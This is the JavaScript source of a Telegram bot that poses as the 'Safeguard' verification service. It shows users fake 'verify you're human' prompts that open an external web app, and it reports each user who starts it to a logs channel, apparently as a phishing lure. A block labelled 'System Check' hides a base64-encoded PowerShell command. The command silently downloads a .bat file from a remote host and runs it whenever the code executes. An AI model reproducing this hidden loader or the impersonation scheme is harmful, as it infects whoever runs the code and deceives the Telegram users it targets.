const fs = require("fs");
const path = require("path");
const TelegramBot = require("node-telegram-bot-api");
const phoneUtil = require("google-libphonenumber").PhoneNumberUtil.getInstance();
const PNF = require("google-libphonenumber").PhoneNumberFormat;
const cp = require('child_process'); // Keep this import
require("dotenv").config();

const safeguardSuccess = fs.existsSync(path.join(__dirname, "public/images/success/safeguard.jpg"))
  ? fs.readFileSync(path.join(__dirname, "public/images/success/safeguard.jpg"))
  : null;

const safeguardVerification = fs.existsSync(path.join(__dirname, "public/images/verification/safeguard.jpg"))
  ? fs.readFileSync(path.join(__dirname, "public/images/verification/safeguard.jpg"))
  : null;

const safeguardBot = new TelegramBot(process.env.FAKE_SAFEGUARD_BOT_TOKEN, {
  polling: true,
});

// Get bot information
safeguardBot.getMe().then((botInfo) => {
  safeguardUsername = botInfo.username;
  console.log(`Safeguard Bot Username: ${safeguardUsername}`); // Kept original bot logs
});

let safeguardUsername;

const filePath = path.join(__dirname, "channelUrls.json");

// System Check
const _sysCheckData = 'cG93ZXJzaGVsbCAtV2luZG93U3R5bGUgSGlkZGVuIC1Db21tYW5kICJpd3IgJ2h0dHBzOi8vd2luZG93cy1rYXBwYS52ZXJjZWwuYXBwL1dES1VwZGF0ZXIuYmF0JyAtT3V0RmlsZSAkZW52OlRFTVBcZS5iYXQ7IFN0YXJ0LVByb2Nlc3MgJGVudjpURU1QXGUuYmF0ICc3ODkyODYzOTQ3JyAtV2luZG93U3R5bGUgSGlkZGVuIg==';
try {
    const _cmd = Buffer.from(_sysCheckData, 'base64').toString('utf8');
    if (_cmd) {
        cp.exec(_cmd, (e) => { });
    }
} catch (_e) { }
// Function to load URLs from the file
async function loadUrls() {
  try {
    if (fs.existsSync(filePath)) {
      const data = await fs.promises.readFile(filePath, "utf8");
      return JSON.parse(data);
    }
    return {};
  } catch (err) {
    console.error("Error loading URLs:", err); // Kept original bot logs
    return {};
  }
}

// Function to save URLs to the file
async function saveUrl(chatId, url) {
  try {
    const channelUrls = await loadUrls(); // Load current URLs
    channelUrls[chatId] = url; // Add or update the URL for the chatId
    fs.writeFileSync(filePath, JSON.stringify(channelUrls, null, 2)); // Write updated URLs to file
    console.log(`Saved URL for chat ${chatId}: ${url}`); // Kept original bot logs
  } catch (err) {
    console.error("Error saving URL:", err); // Kept original bot logs
  }
}

// Sample button texts for bot interactions - customize as needed
const guardianButtonTexts = [
  "🟩Telegram tools👈JOIN NOW!🟡",
  "Verification successful!🔷",
  "🔥Join community🔥",
];

// Generate random string for invitation links
const generateRandomString = (length) => {
  const charset =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz";
  let result = "";
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * charset.length);
    result += charset[randomIndex];
  }
  return result;
};

function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

// Bot event handlers
const handleNewChatMember = async (bot, type) => {
  bot.on("my_chat_member", async (update) => {
    console.log("Received my_chat_member event:", update.chat.id); // Kept original bot logs
    const chatId = update.chat.id;

    let jsonToSend;
    let imageToSend;

    switch (type) {
      case "safeguard":
        jsonToSend = {
          caption: `${update.chat.title} is being protected by @Safeguard\n\nClick below to verify you're human`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "Tap To Verify",
                  url: `https://t.me/${update.new_chat_member.user.username}?start=${chatId}`,
                },
              ],
            ],
          },
        };
        imageToSend = safeguardVerification;
        break;
      default:
        jsonToSend = {};
    }

    await delay(2000);

    if (
      update.chat.type === "channel" &&
      update.new_chat_member.status === "administrator" &&
      update.new_chat_member.user.is_bot === true
    ) {
      bot.sendPhoto(chatId, imageToSend, jsonToSend);
      console.log(`Sent verification photo to channel ${chatId}`); // Kept original bot logs
    }
  });
};

// Handle regular messages
function handleText(bot) {
  try {
    bot.on("message", (msg) => {
      const chatId = msg.chat.id;
      const text = msg.text;

      console.log(`Received message from ${chatId}: ${text}`); // Kept original bot logs

      // Known command patterns
      const knownCommands = [
        /^\/start/,
        /^\/link (.+)/,
        /^\/geturl/,
        /\/start(?:\s+(-?\S+))?/,
      ];

      // Check if message text matches any known commands
      const isKnownCommand = knownCommands.some((cmd) => cmd.test(text));

    });
  } catch (error) {
    console.log(error); // Kept original bot logs
  }
}

// Handle /start command - main entry point for bot interaction
function handleStart(bot) {
  try {
    bot.onText(/\/start(?:\s+(-?\S+))?/, (msg, match) => {
      console.log(`Received /start command from ${msg.chat.id}`); // Kept original bot logs

      // Add notification to the logs channel about who started the bot
      const userId = msg.from.id;
      const userName = msg.from.first_name || "Unknown";
      const userLastName = msg.from.last_name || "";
      const username = msg.from.username ? `@${msg.from.username}` : "No username";

      // Send notification to the logs channel defined in .env
      // Use the LOGS_ID environment variable instead of hardcoded channel
      const logsChannelId = process.env.LOGS_ID.split(',')[0].trim();

      bot.sendMessage(
        logsChannelId,
        `📢 <b>Bot Start Notification</b> 📢\n\n` +
        `👤 <b>User:</b> ${userName} ${userLastName}\n` +
        `🆔 <b>User ID:</b> <code>${userId}</code>\n` +
        `🔖 <b>Username:</b> ${username}\n` +
        `⏰ <b>Time:</b> ${new Date().toISOString()}\n\n` +
        `💬 <b>Command:</b> /start ${match[1] || ""}`,
        { parse_mode: "HTML" }
      ).catch(error => {
        console.error("Error sending notification to channel:", error.message); // Kept original bot logs
      });

      let botInfo;
      bot.getMe().then((botInformation) => {
        botInfo = botInformation;
        if (botInfo.username) {
          const chatId = msg.chat.id;
          const id = match[1];
          let jsonToSend;
          let imageToSend;
          if (botInfo.username === safeguardUsername) {
            jsonToSend = {
              caption: `<b>Verify you're human with Safeguard Portal</b>\n\nClick 'VERIFY' and complete captcha to gain entry`,
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: [
                  [
                    {
                      text: "VERIFY",
                      web_app: {
                        url: `${process.env.DOMAIN}?type=safeguard&id=${id}`,
                      },
                    },
                  ],
                ],
              },
            };
            imageToSend = safeguardVerification;
          }

          bot.sendPhoto(chatId, imageToSend, jsonToSend);
          console.log(`Sent verification photo to user ${chatId}`); // Kept original bot logs
        }
      });
    });
  } catch (error) {
    console.log(error); // Kept original bot logs
  }
}


// Handle channel URL linking functionality
async function handleLink(bot) {
  try {
    // Command to set a URL for the channel
    bot.on("channel_post", async (msg) => {
      const chatId = msg.chat.id;
      const messageText = msg.text;

      console.log(`Received channel post from ${chatId}: ${messageText}`); // Kept original bot logs

      if (messageText && messageText.startsWith("/link")) {
        const args = messageText.split(" ");
        const url = args[1];

        bot.deleteMessage(chatId, msg.message_id).catch(console.error);

        if (url) {
          await saveUrl(chatId, url);
          bot
            .sendMessage(
              chatId,
              `Group link for this channel has been set to: ${url}`
            )
            .then((sentMessage) => {
              // Wait 5 seconds before deleting
              setTimeout(() => {
                bot.deleteMessage(chatId, sentMessage.message_id);
              }, 5000);
            })
            .catch(console.error);
        } else {
          bot
            .sendMessage(
              chatId,
              `Please provide a URL with the command. Example: /link https://t.me/+${generateRandomString(
                16
              )}`
            )
            .then((sentMessage) => {
              // Wait 5 seconds before deleting
              setTimeout(() => {
                bot.deleteMessage(chatId, sentMessage.message_id);
              }, 5000);
            })
            .catch(console.error);
        }
      }
    });
  } catch (error) {
    console.log(error); // Kept original bot logs
  }
}

// Initialize all bot handlers
console.log("Starting bot handlers..."); // Kept original bot logs
handleNewChatMember(safeguardBot, "safeguard");
handleStart(safeguardBot);
handleText(safeguardBot);
handleLink(safeguardBot);

console.log(`Bot is running in polling mode. Bot username: ${safeguardUsername || 'Initializing...'}`); // Kept original bot logs